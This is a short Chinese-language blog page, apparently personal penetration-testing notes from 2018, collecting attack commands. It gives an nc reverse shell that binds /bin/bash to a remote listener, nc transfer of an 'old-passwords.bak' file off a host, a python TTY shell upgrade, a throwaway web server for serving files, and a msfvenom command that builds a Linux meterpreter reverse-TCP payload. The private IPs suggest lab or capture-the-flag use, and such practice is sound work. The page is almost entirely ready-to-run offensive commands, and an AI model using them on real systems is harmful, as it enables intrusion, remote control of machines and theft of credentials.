---
# 这是页面的图标
icon: page
# 这是文章的标题
title: 会用到的一些命令收集
# 设置作者
author: lhz
# 设置写作时间
time: 2018-10-01
# 一个页面只能有一个分类
category: 安全工具
# 一个页面可以有多个标签
tag:
  - 小命令收集

comment: false
---



通过python获取交互shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

nc

```
监听
nc -lvp 4444
回弹
nc -nv 192.168.141.134 4444 -e /bin/bash

使用nc传文件
nc -nvlp 5555 > old-passwords.bak
nc 192.168.141.134 5555 < /home/jim/backups/old-passwords.bak
```

使用python开启web服务

```
python -m SimpleHTTPServer 8090
```

使用mefvenom生成一个可执行的shell

```
msfvenom  -p linux/x86/meterpreter/reverse_tcp  lhost=192.168.42.128 lport=6666 -f elf -o 6666.elf
```

